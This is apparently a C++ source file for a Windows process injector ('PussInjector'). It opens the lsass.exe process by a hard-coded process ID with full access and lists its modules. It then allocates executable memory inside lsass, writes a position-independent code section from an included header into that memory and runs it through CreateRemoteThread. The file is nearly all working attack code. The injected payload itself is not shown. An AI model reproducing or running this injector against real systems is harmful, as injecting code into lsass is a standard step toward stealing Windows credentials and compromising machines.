#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>

#include "PICForRemoteProcess.h"

class PussInjector {
	
private:
public:

	HANDLE hLsass;

	bool OpenLsass() {
		this->hLsass = OpenProcess(PROCESS_ALL_ACCESS, false, 804);
		if (this->hLsass)
			return true;
		else
			return false;
	}

	void ListLsassModules() {
		HMODULE moduleTable[256] = { 0 };
		DWORD cbNeeded = 0;
		if (!this->hLsass)
			return;
		if (!EnumProcessModules(this->hLsass, moduleTable, sizeof(moduleTable), &cbNeeded))
			return;
		for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			char nameBuffer[MAX_PATH];
			GetModuleFileNameExA(this->hLsass, moduleTable[i], nameBuffer, MAX_PATH);

			printf("%s\n", nameBuffer);
		}

		
	}

	~PussInjector() {
		if (this->hLsass)
			CloseHandle(this->hLsass);
	}
};

void __declspec(noinline) x() {
	ReadProcessMemory(0, 0, 0, 0, 0);
	WriteProcessMemory(0, 0, 0, 0, 0);
	OpenProcess(0, 0, 0);
}

int main()
{

	LoadLibraryA("msvcrt.dll");
	
	PussInjector *iPI = new PussInjector();
	if (!iPI->OpenLsass()) {
		printf("Failed to acquire handle on lsass.exe");
		return 0;
	}
	iPI->ListLsassModules();

 	auto mem = VirtualAllocEx(iPI->hLsass, 0, SIZE_PIC_SECTION, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	WriteProcessMemory(iPI->hLsass, mem, (LPVOID)START_PIC_SECTION, SIZE_PIC_SECTION, 0);
	auto hThread = CreateRemoteThread(iPI->hLsass, NULL, 2048, (LPTHREAD_START_ROUTINE)((uintptr_t)(mem)+EP), mem, 0, 0);
	printf("Waiting...\n");
	WaitForSingleObject(hThread, -1);
	printf("RPM address : %p\n", &ReadProcessMemory);
	CloseHandle(hThread);
	//VirtualFreeEx(iPI->hLsass, mem, 0, MEM_RELEASE);

	delete iPI;

	system("pause");
    return 0;
}